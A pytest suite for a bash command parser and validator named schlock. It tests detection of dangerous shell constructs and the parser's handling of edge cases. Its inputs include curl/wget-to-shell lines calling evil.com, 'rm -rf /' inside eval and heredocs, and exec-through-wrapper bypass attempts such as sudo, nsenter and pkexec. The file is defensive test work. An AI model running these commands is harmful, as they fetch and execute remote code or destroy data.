"""Tests for BashCommandParser."""

import contextlib
import logging
import resource
import signal
import subprocess
import sys
import threading
import time

import bashlex
import pytest

from schlock.core import parser as parser_mod
from schlock.core.validator import validate_command
from schlock.exceptions import ParseBudgetError, ParseError
from schlock.integrations.commit_filter import CommitMessageFilter


class TestBashCommandParser:
    """Test suite for BashCommandParser."""

    def test_parse_simple_command(self, parser):
        """Parse simple commands successfully."""
        ast = parser.parse("echo hello")
        assert ast is not None

    @pytest.mark.parametrize(
        "command,expected_commands",
        [
            ("git log | grep pattern", ["git", "grep"]),
            ("ls -la | head -n 10 | tail -n 5", ["ls", "head", "tail"]),
        ],
    )
    def test_parse_pipes(self, parser, command, expected_commands):
        """Parse piped commands."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        for expected in expected_commands:
            assert expected in commands

    @pytest.mark.parametrize(
        "command,expected_cmd",
        [
            ("echo foo > bar.txt", "echo"),
            ("cat input.txt >> output.txt", "cat"),
        ],
    )
    def test_parse_redirects(self, parser, command, expected_cmd):
        """Parse redirected commands."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        assert expected_cmd in commands

    def test_has_dangerous_constructs_detects_eval(self, parser):
        """has_dangerous_constructs detects eval command."""
        ast = parser.parse("eval 'dangerous'")
        dangers = parser.has_dangerous_constructs(ast)
        assert "eval command detected" in dangers

    def test_has_dangerous_constructs_allows_safe_substitution(self, parser):
        """has_dangerous_constructs allows safe command substitution.

        Command substitution is handled by YAML rules, not blanket blocking.
        This allows patterns like $(op read ...) for 1Password.
        """
        ast = parser.parse('echo "$(date)"')
        dangers = parser.has_dangerous_constructs(ast)
        assert dangers == []  # No blanket blocking

    @pytest.mark.parametrize(
        "invalid_command,error_substring",
        [
            ('echo "unclosed string', "Failed to parse"),
            ("((( invalid", "Failed to parse"),
        ],
    )
    def test_parse_invalid_syntax(self, parser, invalid_command, error_substring):
        """Raise ParseError on invalid syntax."""
        with pytest.raises(ParseError) as exc:
            parser.parse(invalid_command)
        assert error_substring in str(exc.value)

    def test_parse_empty_command(self, parser):
        """Raise ValueError on empty command."""
        with pytest.raises(ValueError) as exc:
            parser.parse("")
        assert "cannot be empty" in str(exc.value)

    @pytest.mark.parametrize(
        "command,expected_cmd",
        [
            ("ls -la", "ls"),
            ("git status", "git"),
            ("python script.py", "python"),
        ],
    )
    def test_extract_commands(self, parser, command, expected_cmd):
        """Extract command names correctly."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        assert expected_cmd in commands

    @pytest.mark.parametrize(
        "command,danger_pattern",
        [
            ('eval "rm -rf /"', "eval command detected"),
            ("exec bash", "exec command detected"),
        ],
    )
    def test_dangerous_constructs(self, parser, command, danger_pattern):
        """Detect dangerous command constructs."""
        ast = parser.parse(command)
        dangers = parser.has_dangerous_constructs(ast)
        assert danger_pattern in dangers

    def test_parse_whitespace_only(self, parser):
        """Raise ValueError on whitespace-only command."""
        with pytest.raises(ValueError) as exc:
            parser.parse("   \t\n  ")
        assert "cannot be whitespace-only" in str(exc.value)

    def test_process_substitution_allowed(self, parser):
        """Safe process substitution is allowed (not blanket blocked).

        Process substitution is handled by YAML rules, not blanket blocking.
        This allows safe patterns like diff <(ls dir1) <(ls dir2).
        """
        ast = parser.parse("diff <(ls dir1) <(ls dir2)")
        dangers = parser.has_dangerous_constructs(ast)
        assert dangers == []  # No blanket blocking

    @pytest.mark.parametrize(
        "command,expected",
        [
            # cat's body is inert text. Carrying it would make ~60 rule patterns
            # backtrack over an everyday file write for nothing.
            ("cat <<EOF | grep foo\nhello\nEOF", ["cat <<EOF\n\nEOF", "grep foo"]),
            # A shell's body is source code: drop it and `bash <<EOF | tee log`
            # hides an rm -rf / from every pass.
            ("bash <<EOF | tee log\nrm -rf /\nEOF", ["bash <<EOF\nrm -rf /\nEOF", "tee log"]),
            ("/bin/bash <<EOF | x\nrm -rf /\nEOF", ["/bin/bash <<EOF\nrm -rf /\nEOF", "x"]),
            # A wrapper runs its shell with the wrapper's stdin; wrapping cat keeps it inert.
            ("env bash <<EOF | x\nrm -rf /\nEOF", ["env bash <<EOF\nrm -rf /\nEOF", "x"]),
            ("env bash <<EOF && x\nrm -rf /\nEOF", ["env bash <<EOF\nrm -rf /\nEOF", "x"]),
            ("timeout 5 cat <<EOF | x\nrm -rf /\nEOF", ["timeout 5 cat <<EOF\n\nEOF", "x"]),
            # Each heredoc is closed in opener order.
            ("cat <<A <<B | x\n1\nA\n2\nB", ["cat <<A <<B\n\nA\n\nB", "x"]),
            ("cat <<-EOF | x\n\tq\n\tEOF", ["cat <<-EOF\n\nEOF", "x"]),
            # A redirect after the opener belongs to the command, not the heredoc.
            ("cat <<EOF > out.txt\nsecret\nEOF", ["cat <<EOF > out.txt\n\nEOF"]),
            # CRLF: the slice is stripped of its trailing \r, so the terminator
            # must be too or the segment never re-parses and fails closed on a
            # command bash runs happily.
            ("cat <<EOF\r\nhello\r\nEOF\r\necho ok", ["cat <<EOF\n\nEOF", "echo ok"]),
        ],
    )
    def test_extract_command_segments_closes_heredocs(self, parser, command, expected):
        """A heredoc body lives past its command's span, so the bare slice does
        not re-parse - and a segment with no AST loses literal suppression and
        the quote-stripped pass. Each segment is closed with a terminator, and
        carries its body only when a shell would execute it.
        """
        assert parser.extract_command_segments(command, parser.parse(command)) == expected


class TestDangerousPipelineDetection:
    """Test suite for _detect_dangerous_pipelines AST analysis."""

    def test_curl_pipe_to_sh_detected(self, parser):
        """Detect curl piped to shell."""
        ast = parser.parse("curl http://evil.com/script | sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_wget_pipe_to_bash_detected(self, parser):
        """Detect wget piped to bash."""
        ast = parser.parse("wget -qO- http://evil.com | bash")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_curl_pipe_with_env_var_prefix(self, parser):
        """Detect curl|sh even with VAR=value prefix (bypass attempt)."""
        ast = parser.parse("curl http://x.com/s | VAR=value sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_curl_pipe_with_redirect_suffix(self, parser):
        """Detect curl|sh even with redirects."""
        ast = parser.parse("curl http://x.com/s | sh 2>&1")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_safe_pipeline_not_flagged(self, parser):
        """Safe pipelines (no download->shell) should not be flagged."""
        safe_pipelines = [
            "cat file.txt | grep pattern",
            "ls -la | head -10",
            "ps aux | grep python",
            "echo hello | base64",
        ]
        for cmd in safe_pipelines:
            ast = parser.parse(cmd)
            dangers = parser.has_dangerous_constructs(ast)
            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"

    def test_curl_to_safe_command_not_flagged(self, parser):
        """Curl piped to safe command (not shell) should not be flagged."""
        safe_curls = [
            "curl http://api.example.com | jq .",
            "curl http://example.com | grep pattern",
            "wget -qO- http://example.com | head -10",
        ]
        for cmd in safe_curls:
            ast = parser.parse(cmd)
            dangers = parser.has_dangerous_constructs(ast)
            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"

    def test_single_command_no_pipeline(self, parser):
        """Single command (no pipeline) should not trigger pipeline detection."""
        ast = parser.parse("curl http://example.com")
        dangers = parser.has_dangerous_constructs(ast)
        assert not any("remote code execution" in d for d in dangers)

    def test_empty_ast_handled(self, parser):
        """Empty AST list should not cause errors."""
        # Call internal method directly with empty list
        dangers = parser._detect_dangerous_pipelines([])
        assert dangers == []

    def test_none_ast_handled(self, parser):
        """None AST should not cause errors."""
        dangers = parser._detect_dangerous_pipelines(None)
        assert dangers == []

    def test_multi_stage_pipeline(self, parser):
        """Multi-stage pipeline with download in middle."""
        # curl is first, should detect curl->sh
        ast = parser.parse("curl http://x.com/s | cat | sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_full_path_commands(self, parser):
        """Commands with full paths should be detected."""
        ast = parser.parse("/usr/bin/curl http://x.com/s | /bin/bash")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)


class TestEvalExecDetection:
    """Test eval/exec detection - command name vs argument position.

    SECURITY: Shell builtins eval/exec are dangerous when they ARE the command.
    Container tools (kubectl, docker) use 'exec' as a subcommand/argument,
    which is a completely different security context.

    This test class validates that we:
    1. Block actual shell eval/exec commands
    2. Allow container tools with 'exec' as argument
    3. Detect wrapper bypass attempts (env exec, command exec)
    """

    @pytest.mark.parametrize(
        "command,should_detect,description",
        [
            # === MUST BLOCK: Actual shell eval/exec commands ===
            ("exec bash", True, "Shell exec replaces process"),
            ("exec /bin/sh", True, "Shell exec with path"),
            ('eval "rm -rf /"', True, "Shell eval executes string"),
            ("eval $MALICIOUS", True, "Shell eval with variable"),
            ("/usr/bin/exec bash", True, "Full path to exec"),
            ("VAR=x exec bash", True, "Assignment prefix doesn't hide exec"),
            # === MUST ALLOW: Container tools using 'exec' as argument ===
            ("kubectl exec pod -- cat /etc/hosts", False, "kubectl exec is container tool"),
            ("kubectl exec -it pod -- /bin/bash", False, "kubectl interactive exec"),
            ("kubectl exec -n namespace pod -- ls", False, "kubectl exec with namespace"),
            ("docker exec container ls", False, "docker exec is container tool"),
            ("docker exec -it container bash", False, "docker interactive exec"),
            ("podman exec container cat /etc/passwd", False, "podman exec"),
            ("nerdctl exec container sh", False, "nerdctl exec"),
            ("crictl exec container-id cat file", False, "crictl exec"),
            # === MUST BLOCK: Wrapper command bypass attempts ===
            ("env exec bash", True, "env wrapper bypass"),
            ("command exec bash", True, "command wrapper bypass"),
            ("nohup exec bash &", True, "nohup wrapper bypass"),
            ("timeout 10 exec bash", True, "timeout wrapper bypass"),
            ("nice exec bash", True, "nice wrapper bypass"),
            ("sudo exec bash", True, "sudo wrapper bypass"),
            # === MUST ALLOW: Legitimate wrapper usage (not exec/eval) ===
            ("env VAR=x python script.py", False, "env with environment vars"),
            ("timeout 30 curl http://example.com", False, "timeout with curl"),
            ("nice -n 10 make build", False, "nice with make"),
            ("nohup python server.py &", False, "nohup with python"),
        ],
    )
    def test_eval_exec_detection(self, parser, command, should_detect, description):
        """Verify eval/exec detected only as command name, not argument."""
        ast = parser.parse(command)
        dangers = parser.has_dangerous_constructs(ast)

        has_eval_exec = any("eval command" in d or "exec command" in d or "wrapper command bypass" in d for d in dangers)

        assert has_eval_exec == should_detect, (
            f"{description}: command='{command}' expected detect={should_detect}, got {has_eval_exec}. dangers={dangers}"
        )

    def test_get_command_name_handles_assignments(self, parser):
        """_get_command_name correctly extracts command after VAR=value prefix."""
        ast = parser.parse("VAR=value exec bash")
        # Get the command node
        cmd_node = ast[0]
        cmd_name = parser._get_command_name(cmd_node)
        assert cmd_name == "exec", f"Expected 'exec', got '{cmd_name}'"

    def test_get_command_name_handles_paths(self, parser):
        """_get_command_name strips paths to get basename."""
        ast = parser.parse("/usr/bin/curl http://example.com")
        cmd_node = ast[0]
        cmd_name = parser._get_command_name(cmd_node)
        assert cmd_name == "curl", f"Expected 'curl', got '{cmd_name}'"

    def test_compound_command_exec(self, parser):
        """exec in compound commands (subshells, conditionals) is detected."""
        # Subshell with exec
        ast = parser.parse("( exec bash )")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("exec command" in d for d in dangers), f"Subshell exec not detected: {dangers}"

        # Conditional with exec
        ast = parser.parse("if true; then exec bash; fi")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("exec command" in d for d in dangers), f"Conditional exec not detected: {dangers}"

    @pytest.mark.parametrize(
        "command,should_detect,description",
        [
            # === FD Operations - MUST ALLOW (not process replacement) ===
            ("exec 3>&1", False, "FD duplication - safe"),
            ("exec >logfile.txt", False, "Redirect stdout - safe"),
            ("exec 2>&1", False, "Redirect stderr - safe"),
            ("exec 3<input.txt", False, "Open file for reading - safe"),
            # === Position 5+ bypass attempts - MUST BLOCK ===
            ("env A=1 B=2 C=3 D=4 exec bash", True, "Position 5 bypass"),
            ("nice -n 19 -p 1234 exec bash", True, "Multi-flag nice bypass"),
            ("timeout 30 --signal=KILL exec bash", True, "Multi-flag timeout bypass"),
            # === New wrappers - MUST BLOCK ===
            ("xargs exec bash", True, "xargs wrapper"),
            ("parallel exec bash", True, "parallel wrapper"),
            ("busybox exec bash", True, "busybox wrapper"),
            ("chroot /tmp exec bash", True, "chroot wrapper - container escape"),
            ("nsenter -t 1 exec bash", True, "nsenter wrapper - namespace escape"),
            ("unshare -r exec bash", True, "unshare wrapper - namespace creation"),
            ("setsid exec bash", True, "setsid wrapper"),
            ("pkexec exec bash", True, "pkexec wrapper - privilege escalation"),
            # === New wrapper legitimate usage - MUST ALLOW ===
            ("xargs rm", False, "xargs legitimate use"),
            ("parallel gzip", False, "parallel legitimate use"),
            ("busybox ls", False, "busybox legitimate use"),
            ("chroot /tmp ls", False, "chroot legitimate use"),
            ("nsenter -t 1 ps", False, "nsenter legitimate use"),
            # === Wrapper + Container Tool combinations - MUST ALLOW ===
            # (exec is argument to container tool, not the command being run)
            ("sudo kubectl exec pod -- ls", False, "sudo + kubectl exec"),
            ("timeout 30 docker exec container ls", False, "timeout + docker exec"),
            ("nice kubectl exec -it pod -- bash", False, "nice + kubectl exec"),
            ("nice -n 10 podman exec container sh", False, "nice + podman exec"),
            ("sudo docker exec -it mycontainer bash", False, "sudo + docker exec"),
            ("nohup kubectl exec pod -- tail -f log &", False, "nohup + kubectl exec"),
        ],
    )
    def test_bypass_vectors_and_fd_operations(self, parser, command, should_detect, description):
        """Test security fixes for position bypass and FD operations."""
        ast = parser.parse(command)
        dangers = parser.has_dangerous_constructs(ast)

        has_eval_exec = any("eval command" in d or "exec command" in d or "wrapper command bypass" in d for d in dangers)

        assert has_eval_exec == should_detect, (
            f"{description}: command='{command}' expected detect={should_detect}, got {has_eval_exec}. dangers={dangers}"
        )


def _inner_subst_command(nodes):
    """Return the `command` node inside the first command-substitution reachable from `nodes`.

    Accepts either a single node or the list returned by ``parser.parse``.
    """
    found = []

    def walk(n):
        if found:
            return
        if getattr(n, "kind", None) == "commandsubstitution":
            found.append(n.command)
            return
        for attr in ("parts", "command", "list"):
            child = getattr(n, attr, None)
            if isinstance(child, list):
                for item in child:
                    walk(item)
            elif child is not None and hasattr(child, "kind"):
                walk(child)

    if isinstance(nodes, list):
        for node in nodes:
            walk(node)
    else:
        walk(nodes)
    return found[0] if found else None


def _op_signature(node):
    """Flatten a node into a list of operator ops + leaf words, in source order."""
    sig = []

    def walk(n):
        kind = getattr(n, "kind", None)
        if kind == "operator":
            sig.append(("op", n.op))
        elif kind == "word" and not getattr(n, "parts", None):
            sig.append(("word", n.word))
        for attr in ("parts", "command", "list"):
            child = getattr(n, attr, None)
            if isinstance(child, list):
                for item in child:
                    walk(item)
            elif child is not None and hasattr(child, "kind"):
                walk(child)

    walk(node)
    return sig


class TestAndOrSubstitutionCorrection:
    """The vendored bashlex grammar correction for AND-OR lists inside $( ) (issue #96).

    Without the correction, &&/||/& inside a command substitution raise ParsingError, which the
    fail-closed validator turns into a hard block of legitimate commands.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "echo $(a && b)",
            "echo $(a || b)",
            "echo $(a & b)",
            "echo $(a && b && c)",
            "echo $(a || b || c)",
            "echo $(a && b || c)",
            "echo $(a; b && c)",
            'X=$(cd "$(git rev-parse --git-dir)" && pwd)',
            "echo $(a &&\n b)",
            "diff <(a && b) <(c)",
        ],
    )
    def test_andor_lists_inside_substitution_now_parse(self, parser, command):
        """AND-OR list operators inside $( ) parse instead of raising ParseError."""
        ast = parser.parse(command)
        assert ast is not None

    @pytest.mark.parametrize(
        "command",
        [
            "echo $(a &&)",
            "echo $(&& a)",
            "echo $(a ||)",
            "echo $(a && && b)",
        ],
    )
    def test_malformed_lists_still_rejected(self, parser, command):
        """The correction must not make bashlex accept malformed bash (no over-lenience)."""
        with pytest.raises(ParseError):
            parser.parse(command)

    @pytest.mark.parametrize(
        "inner",
        ["a && b", "a || b && c", "a & b", "a; b && c"],
    )
    def test_substitution_ast_matches_top_level(self, parser, inner):
        """The inner list AST must be structurally identical to the same list parsed top-level.

        Security-critical: the validator walks this AST, so a mis-parse that under-represented the
        operators or commands would let danger through. The flat list/operator signature of the
        substitution body must equal the top-level parse.
        """
        sub_ast = parser.parse(f"echo $({inner})")
        inner_cmd = _inner_subst_command(sub_ast)
        assert inner_cmd is not None
        top_ast = parser.parse(inner)
        assert _op_signature(inner_cmd) == _op_signature(top_ast[0])

    def test_correction_is_idempotent(self):
        """Re-running the correction never clobbers existing actions (guarded fill-only-None)."""
        yp = bashlex.parser.yaccparser
        s2 = yp.goto[0]["simple_list1"]
        amp_state = yp.goto[yp.action[s2]["AMPERSAND"]]["simple_list1"]
        before = yp.action[amp_state].get("RIGHT_PAREN")
        assert before is not None  # applied at import
        parser_mod._apply_andor_substitution_correction()
        assert yp.action[amp_state].get("RIGHT_PAREN") == before

    def test_self_check_reverts_on_bad_table(self):
        """If the derived reduce is wrong (self-check fails), every patched cell is reverted.

        This guards the fail-closed degrade path: a future bashlex/arch table drift must fall back
        to today's conservative over-block, never to a structurally wrong AST.

        We swap ``bashlex.parse`` by hand (not the monkeypatch fixture) so the restore in ``finally``
        runs with the REAL parser — otherwise the self-check would fail again and never restore the
        shared parse tables, breaking every later test.
        """
        yp = bashlex.parser.yaccparser
        s2 = yp.goto[0]["simple_list1"]
        states = [
            yp.goto[yp.action[s2]["AMPERSAND"]]["simple_list1"],
            yp.goto[yp.goto[yp.action[s2]["AND_AND"]]["newline_list"]]["simple_list1"],
            yp.goto[yp.goto[yp.action[s2]["OR_OR"]]["newline_list"]]["simple_list1"],
        ]
        saved = {st: yp.action[st].get("RIGHT_PAREN") for st in states}
        real_parse = bashlex.parse
        try:
            # Reset to virgin (cells absent) so the guarded patch will re-apply.
            for st in states:
                yp.action[st].pop("RIGHT_PAREN", None)

            # Force the self-check to fail: a "must parse" form raises.
            def fake_parse(s, *a, **k):
                if s == "echo $(a && b)":
                    raise bashlex.errors.ParsingError("forced", s, 0)
                return real_parse(s, *a, **k)

            bashlex.parse = fake_parse
            parser_mod._apply_andor_substitution_correction()

            # Reverted: cells back to absent, not left half-patched.
            for st in states:
                assert yp.action[st].get("RIGHT_PAREN") is None
        finally:
            bashlex.parse = real_parse  # restore BEFORE re-applying the correction
            for st in states:
                yp.action[st].pop("RIGHT_PAREN", None)
            parser_mod._apply_andor_substitution_correction()
        # Tables are healthy again for subsequent tests.
        for st, val in saved.items():
            assert yp.action[st].get("RIGHT_PAREN") == val

    def test_derivation_miss_warns_not_silent(self, caplog):
        """A spec that cannot be derived (table drift) must trigger the self-check and warn,
        even though nothing was patched — a silent degrade to fail-closed over-block is a
        silent failure.
        """
        yp = bashlex.parser.yaccparser
        s2 = yp.goto[0]["simple_list1"]
        states = [
            yp.goto[yp.action[s2]["AMPERSAND"]]["simple_list1"],
            yp.goto[yp.goto[yp.action[s2]["AND_AND"]]["newline_list"]]["simple_list1"],
            yp.goto[yp.goto[yp.action[s2]["OR_OR"]]["newline_list"]]["simple_list1"],
        ]
        saved = {st: yp.action[st].get("RIGHT_PAREN") for st in states}
        real_specs = parser_mod._ANDOR_CORRECTION_SPECS
        try:
            # Clear the cells so AND-OR no longer parses -> the self-check will fail.
            for st in states:
                yp.action[st].pop("RIGHT_PAREN", None)
            # Every spec fails to derive a production (bogus RHS) -> missed=True, patched empty.
            parser_mod._ANDOR_CORRECTION_SPECS = (("AMPERSAND", ("simple_list1", "NONEXISTENT"), False),)
            with caplog.at_level(logging.WARNING, logger="schlock.core.parser"):
                parser_mod._apply_andor_substitution_correction()
            assert any("failed self-check" in r.message for r in caplog.records), (
                "a derivation miss with a failing self-check must warn, not silently degrade"
            )
            # Nothing was patched, so nothing to revert.
            for st in states:
                assert yp.action[st].get("RIGHT_PAREN") is None
        finally:
            parser_mod._ANDOR_CORRECTION_SPECS = real_specs
            for st in states:
                yp.action[st].pop("RIGHT_PAREN", None)
            parser_mod._apply_andor_substitution_correction()
        for st, val in saved.items():
            assert yp.action[st].get("RIGHT_PAREN") == val

    def test_correction_never_breaks_import_on_unexpected_error(self, caplog):
        """Any unexpected error while poking the tables is swallowed (best-effort) and warned —
        the import must never break, it just degrades to the fail-closed over-block.
        """
        real_yacc = bashlex.parser.yaccparser

        class _Boom:
            goto: dict = {}
            productions: list = []

            @property
            def action(self):
                raise RuntimeError("simulated table access failure")

        try:
            bashlex.parser.yaccparser = _Boom()
            with caplog.at_level(logging.WARNING, logger="schlock.core.parser"):
                parser_mod._apply_andor_substitution_correction()  # must not raise
            assert any("could not be applied" in r.message for r in caplog.records)
        finally:
            bashlex.parser.yaccparser = real_yacc
            parser_mod._apply_andor_substitution_correction()  # restore the real correction

    def test_continuation_state_drift_paths(self, caplog):
        """A drifted action table (missing shift / missing newline_list goto) makes the state
        walk return None for every operator -> nothing patched, but the miss still warns.

        Crafted tables exercise both `continuation_state` early-return branches:
        AMPERSAND/OR_OR have no shift action (missing key); AND_AND shifts to a state whose goto
        lacks `newline_list`.
        """
        real_yacc = bashlex.parser.yaccparser

        class _Drifted:
            # goto[0]['simple_list1'] = 1 ; action[1] only has AND_AND -> 5 ; goto[5] lacks newline_list
            goto = {0: {"simple_list1": 1}, 5: {}}
            action = {1: {"AND_AND": 5}}
            productions: list = []

        try:
            bashlex.parser.yaccparser = _Drifted()
            with caplog.at_level(logging.WARNING, logger="schlock.core.parser"):
                parser_mod._apply_andor_substitution_correction()  # must not raise
            # No cell could be derived, so nothing was added to the drifted action table.
            assert "RIGHT_PAREN" not in _Drifted.action.get(1, {})
        finally:
            bashlex.parser.yaccparser = real_yacc
            parser_mod._apply_andor_substitution_correction()  # restore the real correction


def test_extract_command_segments_keeps_an_escaped_trailing_blank():
    r"""`\ ` is a one-blank argument; stripping the segment must not leave `echo hi \`."""
    parser = parser_mod.BashCommandParser()
    command = "echo hi \\ ; echo \\\\ ; ls"
    segments = parser.extract_command_segments(command, parser.parse(command))
    assert segments == ["echo hi \\ ", "echo \\\\", "ls"]


def test_restored_escaped_blank_keeps_rebased_literals_honest():
    r"""The restored blank must not shift the segment-relative literal ranges.

    The blank is given back at the one place the slice is taken, so it also
    lands in the parse-once path that rebases literal offsets off the parent
    AST. A segment ending `\ ` is exactly where that could break: a dangling
    `echo 'rm -rf /' \` does not re-parse at all, so the ranges would be
    derived against a segment nothing else can reproduce. Absolute expected
    values, not a both-sides comparison — the two paths share the restore, so
    an over-shift would move them together and stay green.
    """
    parser = parser_mod.BashCommandParser()
    command = "echo 'rm -rf /' \\ ; ls"
    pairs = parser.extract_command_segments_with_literals(command, parser.parse(command))
    assert [(seg.text, seg.string_literals) for seg in pairs] == [("echo 'rm -rf /' \\ ", [(6, 14)]), ("ls", [])]
    text, literals = pairs[0].text, pairs[0].string_literals
    assert [text[start:stop] for start, stop in literals] == ["rm -rf /"]


@pytest.mark.parametrize(
    ("command", "masked"),
    [
        # The outermost body is blanked whole, nested levels and separators with it.
        ("cat $(a $(b $(c)) | d)/.env", "cat $(               )/.env"),
        ("cat <(a | b) `c; d` .env", "cat <(     ) `    ` .env"),
        # A quoted substitution is still code; a single-quoted one is text.
        ('cat "$(a | b)/.env"', 'cat "$(     )/.env"'),
        ("echo '$(a | b)' && ls", "echo '$(a | b)' && ls"),
        # A redirect target is a word too; a `${...}` has no child nodes, so its interior goes.
        ("cat < $(a | b)/.env", "cat < $(     )/.env"),
        ("cat ${x:-$(a | b)}/.env ${y}", "cat ${           }/.env ${y}"),
        # A `\<newline>` earlier in the word moves bashlex's offsets, but the substitution node is
        # rebuilt at its source offsets (_recover_dropped_substitutions), so its body is blanked.
        ('echo "x\\\ny $(echo $(a)x)"', 'echo "x\\\ny $(          )"'),
        # Top-level separators survive, so the masked text is still two commands.
        ("echo $(a; b) && git commit -m x", "echo $(    ) && git commit -m x"),
    ],
)
def test_mask_substitution_bodies_blanks_bodies_in_place(command, masked):
    """Absolute expected text: the caller reuses its literal ranges, so length is the contract."""
    parser = parser_mod.BashCommandParser()
    assert parser.mask_substitution_bodies(command, parser.parse(command)) == masked


def _parse_hung(signum, frame):
    pytest.fail("parse did not return within 5 s")


# A heredoc body the tokenizer never brace-matches, so an unclosed `${` reaches the expander.
UNTERMINATED_BRACE = [
    'git commit -m "$(cat << EOF\n${\nEOF\n)"',
    'git commit -m "$(cat <<EOF\n${\nEOF\n)"',
    'git commit -m "$(cat <<-EOF\n${\nEOF\n)"',
    'git commit -m "$(cat <<\tEOF\n${\nEOF\n)"',
    'echo "$(sh << EOF\n${\nEOF\n)"',
    'git push --force "$(cat << EOF\n${\nEOF\n)"',
    'git commit -m "$(cat <<EOF\nfix: handle ${ in paths\nEOF\n)" && git push',
    'echo "$(cat <<EOF\na ${b\nEOF\n)"',
]


class TestUnterminatedBraceExpansion:
    """bashlex 0.18 loops forever on an unclosed `${` (LAB-4959); schlock makes it raise."""

    @pytest.fixture(autouse=True)
    def _bounded(self):
        # A regression hangs rather than fails; the alarm turns that into a failure where it exists.
        # A timer already armed (pytest-timeout's signal method) bounds the hang itself, and re-arming
        # ITIMER_REAL would silently cancel its deadline for the rest of the run.
        if not hasattr(signal, "setitimer") or signal.getitimer(signal.ITIMER_REAL)[0]:
            yield
            return
        previous = signal.signal(signal.SIGALRM, _parse_hung)
        signal.setitimer(signal.ITIMER_REAL, 5)
        yield
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)

    @pytest.mark.parametrize("command", UNTERMINATED_BRACE)
    def test_unclosed_brace_raises(self, command):
        with pytest.raises(ParseError, match="no closing"):
            parser_mod.BashCommandParser().parse(command)

    @pytest.mark.parametrize(
        "command",
        [
            'git commit -m "$(cat <<EOF\nuse ${HOME} here\nEOF\n)"',
            'git commit -m "$(cat <<EOF\n${\nx}\nEOF\n)"',
            'echo "${x:-default}"',
            "echo ${HOME} $1",
        ],
    )
    def test_closed_brace_still_parses(self, command):
        assert parser_mod.BashCommandParser().parse(command)

    def test_closed_brace_keeps_its_parameter(self):
        ast = parser_mod.BashCommandParser().parse('git commit -m "$(cat <<EOF\nuse ${HOME} here\nEOF\n)"')
        params = []

        class Visitor(bashlex.ast.nodevisitor):
            def visitparameter(self, node, value):
                params.append(value)

        for node in ast:
            Visitor().visit(node)
        assert "HOME" in params


class TestParseBudget:
    """Every bashlex parse is bounded, and one that runs out is denied (LAB-5659).

    Each test runs under a wall-clock alarm so a regression fails instead of hanging the suite.
    """

    # bashlex 0.18 never returns on this input and keeps allocating as it goes.
    PATHOLOGICAL = "x=$(cat <<EOF\n$" + "{x=[[ a ]]\nEOF\n)"

    @pytest.fixture(autouse=True)
    def wall_clock_guard(self):
        def expire(signum, frame):
            pytest.fail("parse was not bounded", pytrace=False)

        previous = signal.signal(signal.SIGALRM, expire)
        signal.setitimer(signal.ITIMER_REAL, 30)
        yield
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)
        parser_mod.reset_parse_budget()  # a spent budget must not leak into later tests

    @pytest.fixture
    def runaway_parse(self, monkeypatch):
        """Make every bashlex parse spin, swallowing Exception the way parser code may. Returns the call count."""
        calls = []

        def spin(*args, **kwargs):
            calls.append(args)
            while True:
                with contextlib.suppress(Exception):  # proves the budget signal is not an Exception
                    sum(range(1000))

        monkeypatch.setattr(parser_mod, "PARSE_CPU_BUDGET", 0.2)
        monkeypatch.setattr(bashlex, "parse", spin)
        return calls

    @staticmethod
    def _validate_in_capped_child(command, budget):
        """(stdout words, wall seconds) of validate_command in a child capped at 1 GiB, so a regression cannot run away."""

        def cap_memory():
            resource.setrlimit(resource.RLIMIT_AS, (1 << 30, 1 << 30))

        probe = (
            "import sys\n"
            "from schlock.core import parser\n"
            "from schlock.core.validator import validate_command\n"
            "parser.PARSE_CPU_BUDGET = float(sys.argv[2])\n"
            "r = validate_command(sys.argv[1])\n"
            "print(r.risk_level.name, r.allowed)\n"
        )
        started = time.monotonic()
        try:
            done = subprocess.run(  # noqa: S603 - fixed interpreter and script
                [sys.executable, "-c", probe, command, str(budget)],
                capture_output=True,
                text=True,
                timeout=20,
                preexec_fn=cap_memory,  # noqa: PLW1509 - no threads are started before the fork
                check=False,
            )
        except subprocess.TimeoutExpired:
            pytest.fail("validate_command did not return", pytrace=False)
        return done.stdout.split(), time.monotonic() - started, done.stderr

    def test_pathological_heredoc_is_denied_within_the_budget(self):
        words, _, stderr = self._validate_in_capped_child(self.PATHOLOGICAL, 1.0)
        assert words == ["BLOCKED", "False"], stderr

    def test_many_runaway_bodies_cost_one_budget(self):
        """Each git config payload is re-parsed by a caller that catches the failure and carries on."""
        body = "x=$(cat <<EOF\n$" + "{x\nEOF\n)"
        command = "".join(f"echo \"$(git config alias.a{n} '!{body}')\";" for n in range(20))
        words, wall, stderr = self._validate_in_capped_child(command, 0.5)
        assert words == ["BLOCKED", "False"], stderr
        assert wall < 8, f"{wall:.1f}s: the budget was spent once per body"  # 20 bodies x 0.5 s = 10 s

    def test_runaway_parse_raises_parse_budget_error(self, runaway_parse):
        with pytest.raises(ParseBudgetError, match="too complex to analyse"):
            parser_mod.BashCommandParser().parse("echo hello")

    def test_a_spent_budget_fails_later_parses_at_once(self, runaway_parse):
        parser = parser_mod.BashCommandParser()
        for _ in range(3):
            with pytest.raises(ParseBudgetError):
                parser.parse("echo hello")
        assert len(runaway_parse) == 1
        parser_mod.reset_parse_budget()
        with pytest.raises(ParseBudgetError):
            parser.parse("echo hello")
        assert len(runaway_parse) == 2

    def test_a_new_command_gets_a_fresh_budget(self, runaway_parse, monkeypatch, no_shellcheck):
        with pytest.raises(ParseBudgetError):
            parser_mod.BashCommandParser().parse("echo hello")
        monkeypatch.undo()
